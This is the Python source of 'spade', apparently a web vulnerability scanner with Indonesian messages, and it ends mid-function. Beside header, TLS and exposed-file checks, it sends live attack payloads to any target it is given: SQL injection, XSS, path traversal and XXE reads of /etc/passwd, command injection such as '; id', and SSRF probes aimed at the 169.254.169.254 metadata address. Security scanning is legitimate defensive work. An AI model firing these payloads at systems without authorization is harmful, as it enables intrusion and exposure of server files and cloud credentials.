#!/usr/bin/env python3
"""
spade — Automated Web Vulnerability Scanner v3
================================================================
Cara pakai:
  python3 spade.py example.com                    # standard (default)
  python3 spade.py example.com --quick             # quick check
  python3 spade.py example.com --detailed          # full scan
  python3 spade.py example.com -o laporan.html     # custom output
  python3 spade.py example.com --csv hasil.csv     # export CSV
"""

import argparse, csv, html as htmlmod, json, os, re, socket, ssl, sys, time
import urllib.parse, urllib.robotparser
from collections import OrderedDict, defaultdict
from datetime import datetime
from html.parser import HTMLParser
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("[!] Butuh 'requests'. Install: pip3 install requests")
    sys.exit(1)

# ── color ──
C = {
    "reset": "\033[0m", "bold": "\033[1m", "dim": "\033[2m",
    "red": "\033[91m", "green": "\033[92m", "yellow": "\033[93m",
    "blue": "\033[94m", "magenta": "\033[95m", "cyan": "\033[96m",
    "bg_red": "\033[41m", "white": "\033[97m",
}
DISABLE_COLOR = False

def c(code, t):
    return t if DISABLE_COLOR else f"{C.get(code,'')}{t}{C['reset']}"
def info(m):   print(f"  {c('blue','[*]')} {m}")
def good(m):   print(f"  {c('green','[v]')} {m}")
def warn(m):   print(f"  {c('yellow','[!]')} {m}")
def err(m):    print(f"  {c('red','[x]')} {m}")
def critical(m): print(f"  {c('bg_red',c('white','[!!]'))} {c('red',m)}")

# ── helpers ──
def normalize_url(url):
    url = url.strip()
    if not re.match(r"^https?://", url, re.I):
        url = "https://" + url
    p = urllib.parse.urlparse(url)
    return f"{p.scheme}://{p.netloc}{p.path or '/'}"

def host_from_url(url): return urllib.parse.urlparse(url).netloc
def scheme_from_url(url): return urllib.parse.urlparse(url).scheme

def join(base, path):
    if path.startswith(("http://","https://")): return path
    return urllib.parse.urljoin(base, path)

def make_session(timeout=15):
    sess = requests.Session()
    retry = Retry(total=2, backoff_factor=0.5, status_forcelist=[429,500,502,503,504],
                  allowed_methods={"GET","POST","HEAD","OPTIONS"})
    sess.mount("http://", HTTPAdapter(max_retries=retry))
    sess.mount("https://", HTTPAdapter(max_retries=retry))
    sess.headers["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/537.36 Chrome/128.0.0.0 Safari/537.36"
    sess.timeout = timeout
    return sess

# ── HTML form parser ──
class FormParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.forms = []
        self._cur = None; self._ta = False
    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "form":
            self._cur = {"action": a.get("action",""), "method": a.get("method","get").upper(), "inputs": []}
        elif tag in ("input","textarea") and self._cur:
            if tag == "textarea": self._ta = True
            self._cur["inputs"].append({"name": a.get("name",""), "type": a.get("type","text"), "value": a.get("value","")})
        elif tag == "select" and self._cur:
            self._cur["inputs"].append({"name": a.get("name",""), "type": "select", "value": ""})
    def handle_endtag(self, tag):
        if tag == "form" and self._cur: self.forms.append(self._cur); self._cur = None
        elif tag == "textarea": self._ta = False
    def handle_data(self, data):
        if self._ta and self._cur and self._cur["inputs"]:
            inp = self._cur["inputs"][-1]
            if not inp["value"]: inp["value"] = data.strip()

# ── crawler ──
class Crawler:
    def __init__(self, sess, base_url, depth=1, max_p=30):
        self.sess = sess; self.base = base_url.rstrip("/")
        self.netloc = urllib.parse.urlparse(base_url).netloc
        self.depth = depth; self.max_p = max_p
        self.visited = set(); self.pages = {}
    def _norm(self, url):
        p = urllib.parse.urlparse(url)
        return f"{p.scheme}://{p.netloc}{p.path.rstrip('/') or '/'}"
    def _internal(self, url): return urllib.parse.urlparse(url).netloc == self.netloc
    def crawl(self):
        q = [(self.base, 0)]
        self.visited.add(self._norm(self.base))
        while q and len(self.visited) <= self.max_p:
            u, d = q.pop(0)
            if d > self.depth: continue
            try:
                r = self.sess.get(u, timeout=10)
                if r.status_code != 200: continue
                self.pages[u] = r.text
                if d < self.depth:
                    for m in re.finditer(r'href=["\'](.*?)["\']', r.text, re.I):
                        link = m.group(1)
                        full = urllib.parse.urljoin(u, link).split("#")[0]
                        n = self._norm(full)
                        if self._internal(full) and n not in self.visited:
                            if not any(n.lower().endswith(e) for e in (".pdf",".zip",".png",".jpg",".gif",".css",".js",".svg",".ico")):
                                self.visited.add(n); q.append((n, d+1))
            except: pass
        return self.pages
    def get_forms(self):
        forms = []
        for url, html in self.pages.items():
            p = FormParser(); p.feed(html)
            for f in p.forms:
                a = urllib.parse.urljoin(url, f["action"]) if f["action"] else url
                forms.append((a, f["method"], f["inputs"], url))
        return forms

def is_echo_endpoint(sess, url, timeout=8):
    """Probe endpoint — kalau ngulangin input mentah, skip buat ngurangin false positive."""
    probe = "__xechoprobe__" + str(int(time.time()))
    try:
        r = sess.get(url, params={"q": probe}, timeout=timeout)
        return probe in r.text
    except: return False

# ══════════════════════════════════════════════════════════════════
# SCAN FUNCTIONS — setiap finding pakai deskripsi jelas
# ══════════════════════════════════════════════════════════════════

def sec_headers(sess, base_url, ctx=None):
    """Cek HTTP security headers + info server + cookie."""
    f = []
    try:
        r = sess.get(base_url, timeout=10)
        h = r.headers

        # Security headers checklist
        checks = [
            ("Strict-Transport-Security", "MEDIUM", "HSTS (HTTP Strict Transport Security) tidak diset. Koneksi HTTP tidak otomatis ditingkatkan ke HTTPS — risiko downgrade attack."),
            ("Content-Security-Policy", "MEDIUM", "CSP (Content Security Policy) tidak diset. Browser tidak dilindungi dari XSS via inline script atau sumber konten tidak terpercaya."),
            ("X-Content-Type-Options", "LOW", "X-Content-Type-Options: nosniff tidak diset. Browser bisa MIME-type sniffing — risiko eksekusi file non-script sebagai script."),
            ("X-Frame-Options", "MEDIUM", "X-Frame-Options tidak diset. Website bisa di-embed di iframe — risiko clickjacking."),
            ("Referrer-Policy", "LOW", "Referrer-Policy tidak diset. URL lengkap (termasuk parameter sensitif) bisa bocor ke pihak ketiga via header Referer."),
            ("Permissions-Policy", "LOW", "Permissions-Policy tidak diset. Fitur browser (kamera, mikrofon, lokasi) bisa diakses tanpa batasan oleh script pihak ketiga."),
        ]
        for hdr, sev, desc in checks:
            val = h.get(hdr)
            if val:
                good(f"{hdr}: {val[:70]}")
                f.append(("INFO", f"HDR_{hdr.upper().replace('-','_')}", f"{hdr}: {val[:70]}"))
            else:
                warn(f"{hdr} tidak diset")
                f.append((sev, f"MISS_{hdr.upper().replace('-','_')}", desc))

        # Server banner leak
        srv = h.get("Server")
        if srv:
            warn(f"Server: {srv}")
            f.append(("LOW","SERVER_LEAK",f"Header Server membocorkan versi: {srv}. Attacker bisa cari CVE spesifik untuk versi tersebut."))

        # X-Powered-By leak
        xp = h.get("X-Powered-By")
        if xp:
            warn(f"X-Powered-By: {xp}")
            f.append(("LOW","XPOWERED_LEAK",f"Header X-Powered-By membocorkan teknologi backend: {xp}."))

        # CORS
        cors = h.get("Access-Control-Allow-Origin")
        if cors == "*":
            warn("CORS: akses dari origin mana pun diizinkan")
            f.append(("MEDIUM","CORS_WILDCARD","Access-Control-Allow-Origin: * — semua domain bisa membaca respons via JavaScript. Risiko data leakage jika halaman mengandung konten privat."))

        # Cookie security check
        ck = h.get("Set-Cookie","")
        if ck:
            issues = []
            if "Secure" not in ck: issues.append("Secure")
            if "HttpOnly" not in ck: issues.append("HttpOnly")
            if "SameSite" not in ck: issues.append("SameSite")
            if issues:
                warn(f"Cookie: tidak ada flag {', '.join(issues)}")
                desc = f"Cookie tidak memiliki flag "
                if "Secure" in issues: desc += "Secure (bisa dikirim lewat HTTP), "
                if "HttpOnly" in issues: desc += "HttpOnly (bisa diakses JavaScript/XSS), "
                if "SameSite" in issues: desc += "SameSite (rentan CSRF), "
                f.append(("LOW","COOKIE_ISSUE",desc.rstrip(", ")+"."))
    except: pass
    return f

def tech_finger(sess, base_url, ctx=None):
    """Deteksi teknologi dari header dan HTML."""
    f = []; info("Mendeteksi teknologi website...")
    try:
        r = sess.get(base_url, timeout=10)
        techs = []
        srv = r.headers.get("Server")
        if srv: techs.append(srv)
        xp = r.headers.get("X-Powered-By")
        if xp: techs.append(xp)
        b = r.text
        if re.search(r'wp-content|wp-includes|wordpress',b,re.I): techs.append("WordPress")
        if 'laravel' in b.lower() or 'livewire' in b.lower(): techs.append("Laravel")
        if 'jquery' in b.lower(): techs.append("jQuery")
        if 'react' in b.lower() or 'react-dom' in b.lower(): techs.append("React")
        if 'vue' in b.lower(): techs.append("Vue.js")
        if techs:
            info(f"Terdeteksi: {', '.join(techs)}")
            f.append(("INFO","TECH","Teknologi terdeteksi: "+', '.join(techs)))
        else:
            info("Tidak ada teknologi yang teridentifikasi secara jelas")
    except: pass
    return f

def robots_txt(sess, base_url, ctx=None):
    """Analisis robots.txt."""
    f = []
    try:
        r = sess.get(join(base_url,"/robots.txt"), timeout=10)
        if r.status_code==200 and "Disallow" in r.text:
            d = re.findall(r"Disallow:\s*(\S+)",r.text,re.I)
            if d:
                warn(f"robots.txt melarang akses ke: {d[:10]}")
                f.append(("INFO","ROBOTS",f"robots.txt berisi {len(d)} aturan Disallow. Path yang diblokir: {d[:8]}. Kadang mengungkap endpoint admin atau path sensitif."))
    except: pass
    return f

def sensitive_files(sess, base_url, ctx=None):
    """Cari file sensitif yang terekspos publik."""
    paths = [("/.env","File env (variabel lingkungan) — bisa berisi database password, API key, secret key aplikasi."),
             ("/.git/config","Konfigurasi Git — ekspos source code dan riwayat commit."),
             ("/.git/HEAD","HEAD Git — konfirmasi repositori Git terekspos."),
             ("/.svn/entries","File SVN — ekspos struktur direktori source code."),
             ("/.htpasswd","File htpasswd — berisi kredensial terenkripsi untuk akses terbatas."),
             ("/phpinfo.php","phpinfo() — informasi konfigurasi PHP lengkap, termasuk path, variabel lingkungan, dan ekstensi."),
             ("/info.php","phpinfo() — informasi konfigurasi PHP lengkap."),
             ("/dump.sql","Dump database SQL — bisa berisi semua data website."),
             ("/db.sql","File SQL — kemungkinan berisi struktur dan data database."),
             ("/wp-config.php","Konfigurasi WordPress — berisi kredensial database, secret keys."),
             ("/config.php","File konfigurasi PHP umum."),
             ("/config.php.bak","Backup file konfigurasi — versi lama mungkin tidak aman."),
             ("/admin/","Halaman admin — panel administrasi website."),
             ("/backup/","Direktori backup — mungkin berisi file sensitif."),
             ("/actuator/health","Spring Boot Actuator health endpoint — informasi kesehatan aplikasi."),
             ("/actuator/info","Spring Boot Actuator info — informasi aplikasi (build, git, env)."),
             ("/swagger-ui.html","Dokumentasi API Swagger — bisa mengungkap endpoint dan parameter API.")]
    f = []; info("Mencari file sensitif...")
    for p, desc in paths:
        try:
            r = sess.get(join(base_url,p), timeout=8)
            if r.status_code==200 and len(r.content)>0 and r.url.rstrip("/")!=base_url.rstrip("/"):
                size = len(r.content)
                if any(k in p for k in [".env",".git",".svn",".htpasswd","dump.sql","db.sql"]):
                    critical(f"File sensitif terekspos: {p} ({size} bytes)")
                    f.append(("CRITICAL","SENSITIVE_FILE",f"File {p} ({size}B) dapat diakses publik. {desc}"))
                elif "phpinfo" in p or "info.php" in p:
                    critical(f"PHP info publik: {p} ({size} bytes)")
                    f.append(("HIGH","PHP_INFO",f"File {p} ({size}B) mengekspos konfigurasi PHP lengkap. {desc}"))
                else:
                    warn(f"File terakses: {p} ({size} bytes)")
                    f.append(("MEDIUM","SENSITIVE_FILE",f"File {p} ({size}B) dapat diakses publik. {desc}"))
            elif r.status_code==403:
                info(f"{p} -> 403 (terproteksi)")
        except: pass
    return f

def dir_listing(sess, base_url, ctx=None):
    """Cek directory listing."""
    dirs = [("/images/","direktori gambar"),("/uploads/","direktori upload"),("/backup/","direktori backup"),
            ("/admin/","direktori admin"),("/assets/","direktori assets"),("/files/","direktori file"),
            ("/css/","direktori CSS"),("/js/","direktori JS")]
    f = []; info("Mengecek directory listing...")
    for d, label in dirs:
        try:
            r = sess.get(join(base_url,d), timeout=8)
            if r.status_code==200:
                t = r.text.lower()
                if "index of" in t or "parent directory" in t:
                    critical(f"Directory listing aktif: {d}")
                    f.append(("HIGH","DIR_LISTING",f"Direktori {d} mengaktifkan directory listing. Siapa pun bisa melihat daftar lengkap file di direktori ini, termasuk file non-publik."))
        except: pass
    return f

def http_methods(sess, base_url, ctx=None):
    f = []; info("Memeriksa metode HTTP...")
    for m in ["PUT","DELETE","TRACE","OPTIONS"]:
        try:
            r = sess.request(m, base_url, timeout=8)
            if m=="OPTIONS":
                a = r.headers.get("Allow","")
                if a and ("PUT" in a.upper() or "DELETE" in a.upper()):
                    critical(f"Metode berbahaya diizinkan: {a}")
                    f.append(("HIGH","HTTP_METHOD",f"Server mengizinkan metode PUT/DELETE: {a}. PUT bisa dipakai unggah file berbahaya, DELETE bisa hapus resource."))
            if m=="TRACE" and r.status_code==200:
                critical("Metode TRACE aktif")
                f.append(("MEDIUM","TRACE_ENABLED","Metode HTTP TRACE aktif. Bisa dieksploitasi untuk Cross-Site Tracing (XST) — mencuri cookie HttpOnly via JavaScript."))
        except: pass
    return f

def cors_check(sess, base_url, ctx=None):
    f = []
    try:
        r = sess.get(base_url, headers={"Origin":"https://evil.com","Host":host_from_url(base_url)}, timeout=10)
        acao = r.headers.get("Access-Control-Allow-Origin")
        acac = r.headers.get("Access-Control-Allow-Credentials")
        if acao=="*" and acac=="true":
            critical("CORS: Access-Control-Allow-Origin: * dengan Allow-Credentials: true")
            f.append(("HIGH","CORS_WILDCARD_CRED","CORS dikonfigurasi dengan Access-Control-Allow-Origin: * DAN Access-Control-Allow-Credentials: true. Ini memungkinkan situs jahat membaca respons yang memuat kredensial pengguna (cookie, token) via JavaScript."))
        elif acao=="https://evil.com":
            warn("CORS: Access-Control-Allow-Origin mencerminkan origin permintaan")
            f.append(("MEDIUM","CORS_REFLECT","CORS mengembalikan nilai Access-Control-Allow-Origin yang sama dengan origin permintaan. Attacker bisa membuat halaman yang membaca data dari situs ini via JavaScript."))
        elif acao=="*":
            warn("CORS: semua origin diizinkan")
            f.append(("MEDIUM","CORS_WILDCARD","Access-Control-Allow-Origin: *. Semua situs bisa membaca respons via JavaScript. Risiko kebocoran data."))
    except: pass
    return f

def tls_ssl(sess, base_url, ctx=None):
    f = []; host = host_from_url(base_url)
    if scheme_from_url(base_url)!="https": return f
    info("Memeriksa TLS/SSL...")
    try:
        ctx = ssl.create_default_context(); ctx.check_hostname=True; ctx.verify_mode=ssl.CERT_REQUIRED
        with socket.create_connection((host,443),timeout=10) as sock:
            with ctx.wrap_socket(sock,server_hostname=host) as ss:
                cert = ss.getpeercert()
                if cert:
                    nb = cert.get("notBefore",""); na = cert.get("notAfter","")
                    good(f"Sertifikat berlaku: {nb} s.d. {na}")
                    try:
                        exp = datetime.strptime(na, "%b %d %H:%M:%S %Y %Z")
                        days = (exp - datetime.now()).days
                        if days<30:
                            critical(f"Sertifikat akan kedaluwarsa dalam {days} hari!")
                            f.append(("HIGH","TLS_EXPIRING",f"Sertifikat SSL/TLS kedaluwarsa dalam {days} hari. Browser akan menampilkan peringatan keamanan kepada pengunjung setelah kedaluwarsa."))
                        elif days<90:
                            warn(f"Sertifikat akan kedaluwarsa dalam {days} hari")
                            f.append(("MEDIUM","TLS_EXP_SOON",f"Sertifikat SSL/TLS kedaluwarsa dalam {days} hari. Perpanjang segera untuk menghindari gangguan."))
                        else: good(f"Sertifikat berlaku {days} hari lagi")
                    except: pass
    except ssl.SSLCertVerificationError as e:
        warn(f"SSL cert: {e}")
        f.append(("HIGH","TLS_CERT_ERR",f"Verifikasi sertifikat gagal: {e}. Pengunjung akan melihat peringatan keamanan."))
    except Exception as e:
        warn(f"TLS error: {e}")
    for pn,pv in [("TLSv1.0",ssl.TLSVersion.TLSv1),("TLSv1.1",ssl.TLSVersion.TLSv1_1)]:
        try:
            ctx2 = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT); ctx2.minimum_version=pv; ctx2.maximum_version=pv
            ctx2.check_hostname=False; ctx2.verify_mode=ssl.CERT_NONE
            with socket.create_connection((host,443),timeout=5) as sock:
                with ctx2.wrap_socket(sock,server_hostname=host) as _:
                    critical(f"Protokol usang didukung: {pn}")
                    f.append(("HIGH",f"WEAK_{pn.replace('.','_')}",f"Server mendukung {pn}. Protokol ini sudah tidak aman dan rentan terhadap serangan seperti POODLE, BEAST. Nonaktifkan dan gunakan minimal TLSv1.2."))
        except: pass
    return f

def scan_sqli(sess, base_url, ctx=None):
    f = []; info("Menguji SQL injection...")
    if is_echo_endpoint(sess, base_url):
        info("  (dilewati: endpoint memantulkan input)")
        return f
    crawler = ctx.get("crawler") if ctx else None
    forms = crawler.get_forms() if crawler else []
    payloads = [("'","petik tunggal"),("' OR '1'='1","OR true"),("' OR 1=1--","OR true komentar"),
                ("' UNION SELECT NULL--","UNION"),("' AND SLEEP(3)--","time-based")]
    errs = ["sql","mysql","syntax error","unclosed quotation","odbc","driver","warning: mysql","pg_query","sqlite","ora-"]
    tested = 0
    # Cek URL params
    for p in ["id","page","p","q","cat","user","uid"]:
        for payload, label in payloads:
            try:
                r = sess.get(base_url, params={p: payload}, timeout=10)
                if any(e in r.text.lower() for e in errs) and len(r.text)<50000:
                    critical(f"SQL injection via parameter '{p}' dengan payload '{label}'")
                    f.append(("HIGH","SQLI",f"Parameter URL '{p}' rentan SQL injection (error-based, payload: {label}). Attacker bisa membaca/mengubah database. URL: {base_url}?{p}={payload[:30]}"))
                    break
            except: pass
        else: continue
        break
    # Cek form params
    for action,method,inputs,page in forms:
        for inp in inputs:
            if inp["type"] in ("text","search","textarea","hidden","") and inp["name"]:
                for payload, label in payloads:
                    try:
                        p = {inp["name"]: payload}
                        url = join(base_url,action)
                        r = sess.get(url, params=p, timeout=10) if method=="GET" else sess.post(url, data=p, timeout=10)
                        if any(e in r.text.lower() for e in errs) and len(r.text)<50000:
                            critical(f"SQL injection via field '{inp['name']}' di form {action}")
                            f.append(("HIGH","SQLI",f"Form field '{inp['name']}' di {action} rentan SQL injection (error-based, payload: {label}). Attacker bisa membaca/mengubah database."))
                            break
                    except: pass
                tested += 1
    info(f"SQLi: {tested} parameter diuji")
    return f

def scan_xss(sess, base_url, ctx=None):
    f = []; info("Menguji XSS...")
    payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        '"><script>alert(1)</script>',
        "javascript:alert(1)",
    ]
    params = ["q","s","search","query","id","page","name","text","term","keyword","msg","message","subject","comment"]
    
    # ── Reflected XSS via GET ──
    for payload in payloads:
        for p in params:
            try:
                r = sess.get(base_url, params={p: payload}, timeout=10)
                if payload in r.text:
                    critical(f"XSS terdeteksi di parameter '{p}' (GET)")
                    f.append(("HIGH","XSS_REFLECTED",f"Parameter '{p}' memantulkan tag script mentah — reflected XSS. Attacker bisa menjalankan JavaScript di browser korban. URL: {r.url}"))
                    break
            except: pass
        else: continue
        break

    # ── XSS via form POST (dari crawler) ──
    crawler = ctx.get("crawler") if ctx else None
    if crawler:
        forms = crawler.get_forms()
        for action,method,inputs,page in forms:
            if method.upper() != "POST": continue
            text_inputs = [i for i in inputs if i["type"] in ("text","search","textarea","") and i["name"]]
            if not text_inputs: continue
            for payload in payloads:
                data = {i["name"]: payload for i in inputs if i["name"]}
                try:
                    r = sess.post(action, data=data, timeout=10)
                    if payload in r.text:
                        critical(f"XSS terdeteksi via POST form {action}")
                        f.append(("HIGH","XSS_POST",f"Form POST di {page} (action: {action}) rentan XSS. Field {text_inputs[0]['name']} memantulkan payload JavaScript. Attacker bisa mengirim link ke korban yang mengeksekusi script di browser mereka."))
                        break
                except: pass
            else: continue
            break
        
        # ── Stored XSS — submit lalu cek halaman lain ──
        if not any("XSS" in x[0] for x in f):
            for action,method,inputs,page in forms:
                if method.upper() != "POST": continue
                text_inputs = [i for i in inputs if i["type"] in ("text","search","textarea","") and i["name"]]
                if not text_inputs: continue
                # Coba payload di field pertama aja
                payload = "<img src=x onerror=alert(1)>"
                data = {}
                for i in inputs:
                    if i["name"]: data[i["name"]] = payload if i == text_inputs[0] else "test"
                try:
                    r = sess.post(action, data=data, timeout=10)
                    # Cek beberapa halaman setelah submit apakah payload muncul
                    for pg_url, pg_html in list(crawler.pages.items())[:5]:
                        if pg_url != page and payload in pg_html:
                            critical(f"Stored XSS: payload muncul di {pg_url}")
                            f.append(("HIGH","XSS_STORED",f"Data dari form di {page} disimpan dan ditampilkan mentah di {pg_url}. Attacker bisa menyuntikkan JavaScript yang dijalankan setiap kali pengguna lain membuka halaman tersebut."))
                            break
                except: pass
    return f

def open_redirect(sess, base_url, ctx=None):
    f = []; info("Menguji open redirect...")
    for param in ["next","redirect","url","return","to","dest","goto"]:
        try:
            r = sess.get(base_url, params={param: "https://evil.com"}, timeout=10, allow_redirects=False)
            if r.status_code in (301,302,303,307,308) and "evil.com" in r.headers.get("Location",""):
                critical(f"Open redirect via parameter '{param}'")
                f.append(("HIGH","OPEN_REDIRECT",f"Parameter '{param}' di {base_url} mengarahkan browser ke URL eksternal tanpa validasi. Attacker bisa memanfaatkan ini untuk phishing (mengelabui korban mengklik link yang mengarah ke situs jahat)."))
                break
        except: pass
    return f

def lfi_check(sess, base_url, ctx=None):
    f = []; info("Menguji LFI / path traversal...")
    if is_echo_endpoint(sess, base_url):
        info("  (dilewati: endpoint memantulkan input)")
        return f
    for param in ["file","page","include","path","doc","load"]:
        for payload in ["../../etc/passwd","../../etc/hosts"]:
            try:
                r = sess.get(base_url, params={param: payload}, timeout=10)
                body = r.text.lower()
                if ("root:" in body or "daemon:" in body):
                    if "../../etc/passwd" not in r.text.lower()[:500]:
                        critical(f"LFI terdeteksi via parameter '{param}'")
                        f.append(("HIGH","LFI",f"Parameter '{param}' di {base_url} memungkinkan pembacaan file server (path traversal). Attacker bisa membaca /etc/passwd dan file sensitif lainnya. Payload: {payload}"))
                        break
            except: pass
        else: continue
        break
    return f

def cmd_injection(sess, base_url, ctx=None):
    f = []; info("Menguji command injection...")
    if is_echo_endpoint(sess, base_url):
        info("  (dilewati: endpoint memantulkan input)")
        return f
    
    cmd_params = ["cmd","command","exec","ping","host","domain","ip","target","hostname"]
    cmd_payloads = [("; id","titik koma + id"),("| id","pipe + id"),("`id`","backtick"),("$(whoami)","subshell")]
    
    # ── Cek GET params ──
    for path in ["/","/ping","/exec","/cmd","/run","/api/exec"]:
        for payload,label in cmd_payloads:
            for param in cmd_params:
                try:
                    r = sess.get(join(base_url,path), params={param: payload}, timeout=10)
                    body = r.text
                    if ("uid=" in body or "gid=" in body) and not any(x in body for x in ["whoami","id","git"]):
                        critical(f"Command injection di {path} via '{param}' (GET)")
                        f.append(("HIGH","CMD_INJECTION",f"Command injection di {path} via parameter '{param}' (GET). Payload: {label}. Attacker bisa menjalankan perintah shell di server dengan hak akses web server."))
                        return f
                except: pass
    
    # ── Cek POST form ──
    crawler = ctx.get("crawler") if ctx else None
    if crawler:
        forms = crawler.get_forms()
        for action,method,inputs,page in forms:
            if method.upper() != "POST": continue
            text_inputs = [i for i in inputs if i["type"] in ("text","search","textarea","") and i["name"]]
            if not text_inputs: continue
            for payload,label in cmd_payloads:
                data = {}
                for i in inputs:
                    if i["name"]: data[i["name"]] = payload if i == text_inputs[0] else "test"
                try:
                    r = sess.post(action, data=data, timeout=10)
                    body = r.text
                    if ("uid=" in body or "gid=" in body) and not any(x in body for x in ["whoami","id","git"]):
                        critical(f"Command injection via POST form {action} (field: {text_inputs[0]['name']})")
                        f.append(("HIGH","CMD_INJECTION_POST",f"Form POST di {page} (action: {action}) rentan command injection via field '{text_inputs[0]['name']}' dengan payload {label}. Attacker bisa menjalankan perintah shell di server."))
                        return f
                except: pass
    return f

def ssrf_check(sess, base_url, ctx=None):
    f = []; info("Menguji SSRF...")
    ssrf_url = "http://169.254.169.254/"
    ssrf_payloads = ["url","uri","link","href","src","ref","reference","callback","redirect","return","next","path","file","document","image","img","target"]
    
    # ── Cek endpoint umum via GET ──
    for path in ["/proxy","/fetch","/curl","/api/proxy","/api/fetch","/api/url","/fetch-url","/proxy?url="]:
        for param in ["url","uri","target"]:
            try:
                target = join(base_url,path)
                r = sess.get(target, params={param:ssrf_url}, timeout=10)
                if r.status_code in (200,301,302) and len(r.content)>10:
                    warn(f"Kemungkinan SSRF: {path}?{param}=...")
                    f.append(("MEDIUM","SSRF",f"Endpoint {path} dengan parameter '{param}' menerima URL eksternal dan merespons. Jika server memproses URL internal (seperti 169.254.169.254 untuk metadata AWS/GCP), attacker bisa mencuri kredensial cloud."))
                    break
            except: pass
    
    # ── SSRF via form POST (crawler) ──
    crawler = ctx.get("crawler") if ctx else None
    if crawler:
        forms = crawler.get_forms()
        for action,method,inputs,page in forms:
            if method.upper() != "POST": continue
            url_fields = [i for i in inputs if i["name"] and any(kw in i["name"].lower() for kw in ssrf_payloads)]
            if not url_fields: continue
            url_field = url_fields[0]["name"]
            data = {}
            for i in inputs:
                if i["name"]:
                    data[i["name"]] = ssrf_url if i["name"] == url_field else "test"
            try:
                r = sess.post(action, data=data, timeout=10)
                # Cek apakah server mem-fetch URL (metadata response muncul)
                if "169.254.169.254" in r.text or len(r.content) > 1000:
                    warn(f"Kemungkinan SSRF via form field '{url_field}' di {action}")
                    f.append(("MEDIUM","SSRF_FORM",f"Form POST di {page} (action: {action}) memiliki field '{url_field}' yang mungkin diproses server sebagai URL. Attacker bisa memanfaatkan ini untuk SSRF — membaca metadata cloud internal atau memindai port jaringan internal."))
                # Cek apakah ada error connection timeout (indikasi fetch attempt)
                elif "timed out" in r.text.lower() or "connection refused" in r.text.lower() or "couldn't connect" in r.text.lower():
                    warn(f"SSRF indikasi: field '{url_field}' di {action} mencoba fetch URL (error timeout)")
                    f.append(("LOW","SSRF_TIMEOUT",f"Field '{url_field}' di form {action} menyebabkan timeout/connection error saat dikirim URL eksternal — indikasi server mencoba mengakses URL tersebut."))
            except: pass
    return f

def rate_limit(sess, base_url, ctx=None):
    f = []; info("Menguji rate limiting...")
    try:
        for _ in range(15):
            r = sess.get(base_url, timeout=8)
            if r.status_code==429:
                good("Rate limiting aktif (HTTP 429)")
                f.append(("INFO","RATE_LIMIT","Rate limiting aktif — server mengembalikan HTTP 429 setelah beberapa permintaan cepat. Melindungi dari brute force."))
                return f
        warn("Tidak ada rate limiting")
        f.append(("LOW","NO_RATE_LIMIT","Tidak ada rate limiting — server tidak memblokir permintaan berulang (tidak ada HTTP 429 setelah 15 permintaan cepat). Rentan brute force login, credential stuffing."))
    except: pass
    return f

# ── DETAILED modules ──

def scan_ssti(sess, base_url, ctx=None):
    f = []; info("Menguji SSTI (Server-Side Template Injection)...")
    if is_echo_endpoint(sess, base_url):
        info("  (dilewati: endpoint memantulkan input)")
        return f
    crawler = ctx.get("crawler") if ctx else None
    params = [("q",False),("name",False),("search",False),("user",False)]
    if crawler:
        for a,m,inps,p in crawler.get_forms():
            for i in inps:
                if i["type"] in ("text","search","textarea","") and i["name"]: params.append((i["name"],True))
    tests = [("{{7*7}}","49","Jinja2/Twig"),("{{7*'7'}}","7777777","Jinja2"),("${7*7}","49","Freemarker")]
    for param,_ in params:
        for payload, expected, engine in tests:
            try:
                r = sess.get(base_url, params={param: payload}, timeout=10)
                if expected.lower() in r.text and payload.lower() not in r.text:
                    critical(f"SSTI terdeteksi: '{param}' menggunakan engine {engine}")
                    f.append(("HIGH","SSTI",f"Parameter '{param}' di {base_url} rentan Server-Side Template Injection (engine: {engine}). Payload '{payload}' dieksekusi server menjadi '{expected}'. Attacker bisa menjalankan kode remote (RCE), membaca file, atau mengakses variabel lingkungan server."))
                    return f
            except: pass
    return f

def scan_xxe(sess, base_url, ctx=None):
    f = []; info("Menguji XXE (XML External Entity)...")
    
    # Payload XXE — baca /etc/passwd via entity eksternal
    xxe_payloads = [
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    ]
    
    # ── Kirim langsung ke endpoint umum dengan Content-Type XML ──
    xxe_paths = ["/api/xml","/xml","/soap","/api/soap","/api/upload","/ws","/api/ws"]
    for path in xxe_paths:
        url = join(base_url, path)
        for payload in xxe_payloads:
            try:
                r = requests.post(url, data=payload, headers={"Content-Type": "application/xml"}, timeout=10)
                body = r.text.lower()
                if "root:" in body and ":" in body and "/bin/bash" in body:
                    critical(f"XXE terdeteksi di {url}")
                    f.append(("HIGH","XXE_DIRECT",f"XXE di {url}: payload XML mentah berhasil membaca /etc/passwd. Attacker bisa membaca file server (konfigurasi, kredensial, source code), melakukan SSRF ke jaringan internal, atau denial of service (Billion Laughs)."))
                    return f
            except: pass
    
    # ── XXE via form POST ──
    crawler = ctx.get("crawler") if ctx else None
    if crawler:
        forms = crawler.get_forms()
        for action,method,inputs,page in forms:
            if method.upper() != "POST": continue
            types = {i["type"] for i in inputs}
            text_inputs = [i for i in inputs if i["name"]]
            # Cari form yg punya field "xml" atau file upload
            has_xml_field = any("xml" in i["name"].lower() for i in text_inputs)
            if not has_xml_field and "file" not in types: continue
            for payload in xxe_payloads:
                data = {}
                for i in inputs:
                    if i["name"]:
                        # Inject XXE ke field yang namanya mengandung "xml"
                        if "xml" in i["name"].lower():
                            data[i["name"]] = payload
                        else:
                            data[i["name"]] = "test"
                try:
                    r = requests.post(join(base_url,action), data=data, timeout=10)
                    body = r.text.lower()
                    if "root:" in body and ":" in body and "/bin/bash" in body:
                        critical(f"XXE terdeteksi via form {action}")
                        f.append(("HIGH","XXE_FORM",f"XXE di form {page} (action: {action}): field XML menerima entity eksternal dan mengeksekusi pembacaan file. Attacker bisa membaca file server sensitif."))
                        return f
                except: pass
    return f

def scan_nosqli(sess, base_url, ctx=None):
    f = []; info("Menguji NoSQL injection...")
